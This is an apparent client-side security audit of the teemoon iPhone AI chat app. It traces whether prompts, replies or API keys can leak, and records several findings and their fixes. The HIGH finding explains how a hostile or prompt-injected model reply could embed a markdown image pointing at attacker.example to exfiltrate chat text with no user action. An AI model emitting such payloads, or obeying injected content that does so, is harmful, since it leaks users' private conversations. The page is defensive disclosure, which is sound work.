# teemoon iPhone client (1.0) — Plaintext and Key Exfiltration Audit

> Client side of the teemoon plaintext question. Lineage: [`../README.md`](../README.md)
> · Map: [`../ARCHITECTURE.md`](../ARCHITECTURE.md) · Surface: [`../audit-surface.md`](../audit-surface.md)

**Question.** The app composes every prompt and decrypts every reply, so it
holds plaintext unconditionally. Does anything on the device copy that
plaintext to a log, an unprotected file, the pasteboard, or a network
destination other than the sealed send path — with no user action, or driven
by adversary-controlled content?

**Where plaintext exists at this commit (structural, not findings):** the
composer and `ChatViewModel`; the SwiftData store and its FTS sidecar; the
transports until they seal (near.ai) or by definition (home / custom / other
clouds); the on-device LiteRT runtime in-process; the transcript renderer; the
Siri intent's prompt.

**Independent confirmation.** The prompt at the end of this page was re-run by
a separate Fable agent against the same fixed tree (finder→refuter, static
source read). It reproduced this verdict, confirmed the markdown-image fix holds
on every render path — including the streaming root, which the parser strip
covers even though the loader belt is not applied there — and found no
additional no-user-action exfil path.

## Findings

(method §4b) and apply to this commit unchanged; the one HIGH below was found
and fixed before publish.

### MEDIUM (deployed: yes; fixed in 1.0.3) — the near.ai API key is written in cleartext to the shared URL cache on disk

Identical code at this commit: the model attestation-report fetch sets
`Authorization: Bearer` (`Confidential/AttestationService+Model.swift:104`)
through `URLSessionHTTP`, whose default is `URLSession.shared` with the disk
cache enabled and no cache policy set anywhere. Observed on 1.0.2: nine
cached copies of the key in `Library/Caches/ai.teemoon.app/Cache.db`.
Evidence, scenario and remediation on the [1.0.2 page](v1.0.2-21d534e.md#findings);
the fix and its measurement on the [1.0.3 page](v1.0.3-7edcb55.md#findings).

### LOW (deployed: yes — since 1.0; back-applied 2026-09-19 from the 1.0.4 page) — reply text and model-written tool arguments are interpolated into unfenced log statements

Present at this commit and not seen by this page's review: `Inference/ChatGeneration.swift:325` logs the first 120
characters of each finished reply and `Inference/GenerationEngine.swift:392` each tool call's arguments, both at debug
level; `Inference/GenerationEngine.swift:307` logs stripped reply fragments at warning level. None is `#if DEBUG`-fenced
or carries an explicit privacy level, so on a phone the text is redacted by the platform's default and the debug lines
are not persisted — the platform's protection, not the app's. **This corrects any statement on this page that the
inference path's log lines never carry a body, and any runtime-pass count of zero app-originated lines with message
text:** those passes streamed the log at the default level, which drops debug lines. Found by the 1.0.4 runtime pass
streaming at debug level; full account and remediation on the
[1.0.4 page](v1.0.4-3abe3e2.md#low-deployed-yes--since-10--reply-text-and-model-written-tool-arguments-are-interpolated-into-unfenced-log-statements).

## The one finding fixed before publish

### HIGH (deployed: no — fixed pre-publish 2026-08-31) — assistant markdown could auto-fetch a remote URL, exfiltrating plaintext with no user action

The transcript renders assistant-authored markdown with a vendored renderer
(`Vendor/textual`). Its attachment resolver defaults to the URL-fetching image
loader (`AttachmentLoader.swift:60`, `imageAttachmentLoader = .image()`), and on
render — **no tap** — `WithAttachments.task` fetches any image-run URL through
`ImageLoader`'s **own** `URLSession`, which is not the E2EE transport and is not
subject to the app's provider egress allowlist. Every transcript render path
reaches it: streaming replies go through `StructuredText.cached` unconditionally,
and settled replies route there whenever the content carries a heading, list,
code fence, table, or blockquote — trivially forced by a model that controls the
whole reply.

So a hostile provider, or a model steered by injected content (a tool result, a
web-search grounding snippet, a pasted document), could emit
`![](https://attacker.example/?leak=…)` and cause the device to issue a GET
carrying whatever the model encoded into the URL. That defeats the product's
central claim — "only you and the attested hardware can read these" — on the
**response** side, entirely outside the cryptographic perimeter the near.ai-side
audits and the client's own E2EE Phase-4 fixes protect. Confirmed reachable and
load-bearing against the reviewed bytes: the parser really does emit an
auto-fetchable `imageURL` for `![]()`, pinned by test.

**Remediation (shipped in the fix above, two layers):**

1. `CachedMarkdownParser.withoutRemoteImages` strips the `imageURL` attribute —
   the exact attribute the resolver keys off — at the single shared parser every
   transcript render flows through (the strip is not platform-gated). Alt text
   stays visible; no image is fetched.
2. `NoRemoteAttachmentLoader` (resolves nothing, issues no request) is installed
   at both hosting roots via `blockingRemoteTranscriptAttachments()`, beside the
   existing transcript styling, disabling both the image and custom-emoji
   loaders as a belt on the resolver itself.

Regression: `teemoonTests/MarkdownAttachmentExfiltrationTests` (5 tests,
including a proof that the un-stripped parser would have emitted the fetchable
URL, so the strip cannot become a silent no-op). App target builds; suite green.
No product capability is lost — the client sends no multimodal content and has no
feature that renders model-supplied remote images.

## Keys — the first axis

Walked at this commit with the same question: does a provider key reach
anywhere but the Keychain and the provider it belongs to? Line-level evidence
for the current pin is tabulated on the [1.0.2 page](v1.0.2-21d534e.md); of
the files involved, only `Confidential/AttestationService*.swift`,
`Providers/ProviderStore+Credentials.swift`, the key-entry view
`Views/Settings/ProviderConnectionSection.swift` (a `SecureField` at both
commits; 1.0.2 changed its initializer and prompt), and the DEBUG-only
`App/UITestHostSecrets.swift` changed between this commit and that one, and
none of those changes moved a key.

- **Every request that attaches a key goes to the key's own provider.** The
  chat request (`Inference/HTTPTransport.swift`), the near.ai model catalog
  and attestation-report fetches, the per-reply signature fetch, the Brave key
  check and `web_search`, the Fireworks and xAI control planes, and the
  generic endpoint probe — which sends a key only to the base URL the user
  configured together with it. The certificate-agnostic TLS-attestation probe
  carries none: that was pre-publish finding 4.2, fixed in the 1.0 root and
  pinned by `probeRequest_carriesNoAuthorizationHeader`.
- **Storage.** Keychain `kSecAttrAccessibleAfterFirstUnlock`, not
  synchronizable; the providers JSON holds the id. No key in any log line or
  URL query. **The key is also on disk in the URL cache** — the MEDIUM above,
  missed by this read.
- **Display and copy.** `SecureField` on entry with a user-held reveal;
  `Clipboard.copySensitive` on copy; the debug panel shows headers verbatim on
  screen by design and redacts them on every copy path, and its record is
  memory-only.
- **Export.** The self-verify script reads the key from the environment,
  never embeds it.

## What was checked and came back clean

Each verified in `teemoonai/teemoon-ios` source at the reviewed commit.

- **Send path fails closed.** There is exactly one send-authorization definition,
  `ConfidentialSession.sendPolicy` (`Confidential/ConfidentialSession+Verdict.swift:247`);
  `ChatViewModel` and every UI gate consult it, and the transport seals or throws
  rather than falling back to cleartext. A wrong-length model key degrades rather
  than nil-passing. (These were the pre-publish fail-open transport/verdict defects; the fixing
  commit `846dc5c` is in the private pre-publish history, but the 1.0 root
  carries the fixes and the tripwire suite `teemoonTests/E2EESecurityExploitTests.swift`
  pins them in the public tree.)
- **The Siri/Shortcuts entry point is gated too.** `RequestLLMIntent`
  (`App/RequestLLMIntent.swift:75`) calls `refusalDialog(policy: session.sendPolicy, …)`
  and refuses when the policy is not `.allow` — a headless intent cannot show a
  confirmation modal, so this also closes the cold-start window that a UI gate
  would have caught. It refuses an attested provider with no E2EE peer rather
  than sending in the clear.
- **Chat history at rest is encrypted and backup-excluded.** The SwiftData store
  and its `-wal`/`-shm` sidecars are set to `FileProtectionType.completeUnlessOpen`
  and `isExcludedFromBackup` (`App/teemoonApp.swift:227-240`), re-applied every
  launch. `.completeUnlessOpen` (not `.complete`) is a deliberate
  availability/locked-encryption trade documented at the write site.
- **The full-text search sidecar carries the same protection.** The FTS index is
  a second file holding the same message text; `ChatSearchService.configure`
  (`Chat/Search/ChatSearchService.swift:64`) and `rehardenIfNeeded` (`:87`) both
  run the identical hardening on it, so it is not a softer copy of the store.
- **Key copy is confined.** API-key copies go through
  `Clipboard.copySensitive` (`Views/PlatformChrome.swift:134`): `localOnly` with a
  120 s expiration on the shipped iPhone build (the unshipped macOS branch uses
  `org.nspasteboard.ConcealedType`). Regression:
  `SensitiveClipboardTests`.
- **The last-request debug card does not leak keys on copy.** `Authorization`
  and key-bearing headers are redacted on the copy path in every build (on-screen
  display is a deliberate developer-mode feature); attestation/body logging is
  bounded and `.private`. Regressions: `DebugCopyRedactionTests`,
  `LogBodyPreviewTests`.
- **No analytics, crash, or telemetry SDK.** `Package.resolved` across the app
  and all local packages contains no Firebase/Sentry/Amplitude/Mixpanel/
  Crashlytics/Datadog/Segment/etc.; no `track(`/`logEvent`/analytics call sites
  in source. There is no third-party pipe for plaintext to reach.

## Residuals — stated, not hidden

These are properties of the design, not bugs; a reader deciding to trust the
client should weigh them.

- **Opt-in web search is a content-driven egress.** If the user configures a
  Brave grounding key, the model can emit tool-call search queries — and a
  hostile model could encode prior context into one. They go only to the single
  fixed host the feature targets (`api.search.brave.com/res/v1/llm/context`,
  `BraveWebSearchTool.swift:514`), never to a model-chosen URL, and the tool
  extracts result *text* without fetching any result URL (`:483-509`). Keyless,
  the feature cannot search — it only shows an offer card. This is inherent to
  any web-search feature; the destination is the user's own chosen engine, not a
  silent channel. It is the one place adversary-influenced content reaches the
  network by design, so it is called out rather than buried.
- **Provider keys restore via encrypted backup.** The Keychain uses
  `kSecAttrAccessibleAfterFirstUnlock` (not `…ThisDeviceOnly`), so keys survive
  to a new device through an encrypted backup rather than re-entry
  (`Keychain.swift:41-50`; deliberate, OSS-audit decision 0.6). Not iCloud-synced
  (`kSecAttrSynchronizable` unset); keys live only in the Keychain, never in the
  persisted providers JSON.
- **An unattested provider sends plaintext by definition.** If the user
  configures a plain provider with no attestation / no E2EE peer, there is no
  ciphertext to protect and the send is cleartext to that endpoint. The gate
  above enforces the *attested* promise; it does not manufacture confidentiality
  a chosen endpoint never offered. This is the same truth the architecture note
  states for the degraded server path.
- **The user can still copy assistant content to the general pasteboard.** The
  code-block "copy" control (`Views/CodeBlock.swift:81`) uses the general
  pasteboard by design — it is a user-initiated copy of visible content, not a
  silent exfiltration, and is out of scope for the "no user action" question this
  note answers. Only *secrets* (keys) are routed through `copySensitive`.
- **E2EE metadata is plaintext by protocol.** Model id, sampling parameters,
  role sequence and per-field lengths travel unsealed by near.ai's E2EE design —
  the same perimeter the server-side audits describe. The client claims nothing
  beyond it; see the E2EE-perimeter treatment in the teemoon project's own audit.

## Audit prompt (as run)

This page was produced by the prompt below, its conclusions verified against
source, and re-run once by an independent Fable agent on the fixed tree. The
current portable form, with obtain steps and the delta variant, is
[`/client/method.md` §3](/client/method.md#3-the-portable-audit-prompt).

> **CLIENT PLAINTEXT-EXFILTRATION AUDIT — teemoon Apple client (`teemoon-ios`).**
>
> The only question: on the user's device, can anything move the user's
> plaintext — prompt text, model replies, or provider API keys — to a place the
> user did not intend (a log, an unprotected or un-backup-excluded file, the
> system pasteboard, or a network destination other than the sealed provider
> send path)? Count paths that need **no user action** and paths driven by
> **adversary-controlled content** (a hostile or prompt-injected model reply, a
> tool result, a pasted document, a search-grounding snippet). Assume the
> model/provider is hostile. This is the device axis; do **not** audit near.ai
> server images / manifests / OS.
>
> Method: for each surface, trace from where plaintext exists to every sink and
> decide, with file:line evidence, whether a leak is reachable. Finder→refuter —
> try to disprove each suspected leak before reporting it. A finding sensitive
> before it is fixed gets file:line pointers, never a working exploit recipe.
>
> Surfaces: (1) **send path & egress** — can a request leave without E2EE for an
> attested provider; is send-authorization a single choke-point; any URLSession
> outside the provider egress that fetches attacker-influenced URLs. (2)
> **content renderers** — does any renderer (markdown, HTML, image, link
> preview, favicon) fetch a URL from model/user content on render, no tap. (3)
> **at-rest** — the store and every sidecar holding message text (incl. the FTS
> index and its `-wal`/`-shm`): file-protection class and backup exclusion,
> applied and re-applied each launch. (4) **pasteboard** — are secrets confined
> to a local/concealed/expiring pasteboard; any general-pasteboard or Handoff
> broadcast of plaintext. (5) **logs & crash** — `os_log`/`print` of bodies or
> keys (privacy level), any crash/analytics reporter, the debug card's redaction
> on display and copy. (6) **alternate entry points** — Siri/Shortcuts, widgets,
> Spotlight, share/notification extensions. (7) **dependencies** — `Vendor/` and
> SPM: any telemetry/analytics/crash SDK, or a component that makes its own
> network requests with app plaintext.
>
> Output: a verdict line opening with a class (private / leaks / compromisable /
> qualified-pass / inconclusive) plus caveats; findings as
> `### SEVERITY (deployed: yes/no[ — qualifier]) — title` with file:line
> evidence and a concrete leak scenario; residuals that are by-design; and what
> was not covered.

The verification is not optional and not transferable: this note records a read
of specific bytes, and the next client change re-opens it.

## Addendum 2026-11-25 — a near.ai lookalike host got the encrypted treatment

### LOW (deployed: ARMED, needs the user to add a custom provider whose URL contains "near.ai") — gate: a provider counts as near.ai when its URL contains the text "near.ai" anywhere, so a lookalike host gets the attested, end-to-end-encrypted treatment

Traced at 2d9e206 (v1.0.0); every line number below was checked at this tag. Paths are under `teemoon/`. A source read: nothing here was run.

- **Precondition.** The user adds a custom provider by hand whose URL contains `near.ai` somewhere: a host such as `near.ai.example.com` or `api.linear.ai`, or a path such as `/near.ai/v1`. No preset does this. The user's own key and messages going to the host they typed is not a leak and is not the finding. The finding is what the app claims about that host, and whose key it seals to.
- **Gate.** The capabilities getter grants `.attestation` and `.endToEndEncryption` when `endpoint.contains("near.ai")` and the model's tier is `.teeOwn` (`Providers/Provider.swift:278-280`). That is a substring test on the whole URL, not a host rule. The tier does not narrow it much: `classify` returns `.teeOwn` for every id it does not recognise (`Providers/NearAIModelCatalog.swift:114-131`, the default at `:131`), and the catalog cache is read only after it (`:90-91`). An id that names a closed vendor (claude, gpt-, gemini, o3, o4, -max) or a known third-party id does not qualify; any other id does.
- **What the capability shows before any check.** The provider's row reads "<provider name> · end-to-end encrypted" (`Presentation/WhereProviderPresentation.swift:139-140`).
- **A model id near.ai does not list: nothing is sent.** The refresh looks the model up in near.ai's own directory, `https://completions.near.ai/endpoints` (`Providers/EndpointDirectory.swift:29`, `:47-53`; `Confidential/ConfidentialSession+Refresh.swift:87-88`). With no host for the id there is no record (`:96-118`), so no seal context (`Confidential/ConfidentialSession.swift:183-190`), and the send is refused with "End-to-end encryption could not be established, so nothing was sent." (`Chat/ChatViewModel.swift:91-92`, `:182`). The row's claim is wrong and the provider cannot be used; no message leaves.
- **A model id near.ai lists: where each request goes.**
  - The plain attestation report: `GET <custom host>/attestation/report`, with the user's key (`Confidential/AttestationService.swift:44-64`, `:97-118`); the host must answer it with a decodable report or fail the connection, and either way the record is built (`Confidential/AttestationService.swift:97-145`).
  - The model report, the one that supplies the sealing key: a race between near.ai's direct host for that model and `<custom host>/attestation/report?model=…&signing_algo=ed25519` (`Confidential/AttestationService+Model.swift:40-54`). The first source to return a key wins (`:170-182`); nothing prefers near.ai's answer. The custom host's answer needs a 32-byte key, and a matching `model_name` only if it sends one (`:123-134`).
  - The GPU-node report: near.ai's direct host (`Confidential/AttestationService.swift:90-92`; `Confidential/AttestationService+GPU.swift:52-59`).
  - The TLS check: near.ai's direct host, with no credential (`Confidential/ConfidentialSession+Verifiers.swift:167-185`).
  - The chat request: `POST <custom host>/chat/completions` with the user's key (`Inference/HTTPTransport.swift:59-67`, `:77-81`), its body sealed to the record's `modelEd25519PubKey` (`Inference/ConfidentialLanguageModel.swift:46-52`; `Inference/HTTPTransport.swift:68`, `:92-96`; `Confidential/AttestationService.swift:198`).
- **Whose key the message is sealed to.** Whichever source won the race. If the custom host answers first, the message is sealed to a key that host chose and is posted to that host, which can open it. If near.ai's host wins, the message is sealed to near.ai's enclave key and posted to the custom host, which cannot open it.
- **A key with no quote asked; it did not block.** The state is degraded (`Confidential/ConfidentialSession+Verdict.swift:98-106`), and the break is not a hard one, because that needs a quote that is present and fails (`:211-238`). The send policy is therefore the ask (`:246-261`; `Confidential/TrustVerdict.swift:87-90`), with the reason "The model's hardware attestation is unavailable." (`Confidential/ConfidentialSession+Verdict.swift:162`) and the caption "not end-to-end encrypted" (`Confidential/AttestationState.swift:28`). If the user confirms, the message goes out sealed to that key. A made-up quote fails Intel's check and blocks (`Confidential/DCAPService.swift:100`).
- **A key with a genuine quote reads as verified.** The model quote is checked for three things: it chains to Intel (`Confidential/AttestationService+Model.swift:136-138`; `Confidential/DCAPService.swift:100`), the key sits in its report data (`Confidential/AttestationRecord.swift:128-134`), and it echoes the app's nonce (`:170-186`). Its measurements are compared with no reference. A quote from any genuine TDX guest the host's operator runs, carrying that operator's key and the app's nonce, passes all three. No other degrade condition (`Confidential/ConfidentialSession+Verdict.swift:50-91`) has to fire: the custom host controls the plain report, and the GPU-node report and the TLS check go to near.ai's real host for that model, so whatever genuine evidence that host returns sits on the same screen as the operator's key (whether near.ai answers a request carrying another host's key was not tested). The state is `.ok` (`:103`) and the send is allowed with no ask.
- **What the app then shows.** The caption "end-to-end encrypted" (`Confidential/AttestationState.swift:27`), the hero "encrypted to <model> — only it can read this" with "only you and <model>'s sealed hardware can read this chat." (`Confidential/TrustVerdict.swift:153`, `:177`), and the chain line that says not the provider, not the network, nobody else can open it (`:190-191`). For this provider that is false: the host's operator holds the key. The app shows the provider under the name the user gave it, not as near.ai.
- **The user's key for the custom host also reaches near.ai's hosts.** The credential stored for the custom provider (`Confidential/ConfidentialSession+Refresh.swift:71`, `:121-124`) is sent as a bearer token to near.ai's direct host for that model, on the GPU-node report and on the direct model report (`Confidential/AttestationService.swift:44-64`, `:90-92`, `:93-95`; `Confidential/AttestationService+GPU.swift:59`; `Confidential/AttestationService+Model.swift:40-46`, `:104`). This needs no hostile party, only the precondition and a model id near.ai lists. For such a provider this page's statement that a key leaves the device only to its own provider does not hold: near.ai receives a key the user stored for another host.
- **Severity and state.** LOW, ARMED. Not INFO: under the precondition the app's central sentence is false, the verified state can be reached by a host that is not near.ai with a key it chose, and a key goes to a host the user did not configure. Not MEDIUM: nothing happens until the user types such a URL into a custom provider and picks a model id near.ai lists; the message reaches only the host the user typed, which is where a custom provider's messages go with no claim at all, so no third party gains a message; the verified state needs a host built for the purpose that also runs real TDX hardware, and without a genuine quote the app asks or blocks; the key that strays goes to near.ai and nowhere else. What is lost is the assurance: a user who believed the screen could send that host what they would not have sent it in the clear. No report of a provider configured this way is known to this review.
- **Fixed in v1.0.4.** At 3abe3e2 the getter tests `isNearAI` (`Providers/Provider.swift:285`), which is the host rule `host == "near.ai" || host.hasSuffix(".near.ai")` (`Providers/WhereLocality.swift:85-90`; `Providers/EndpointModelCatalog.swift:149`). No `contains("near.ai")` and no `hasSuffix("near.ai")` is left in the app's Swift source at that tag. A lookalike host gets neither capability and is an ordinary custom provider with no encryption claim.
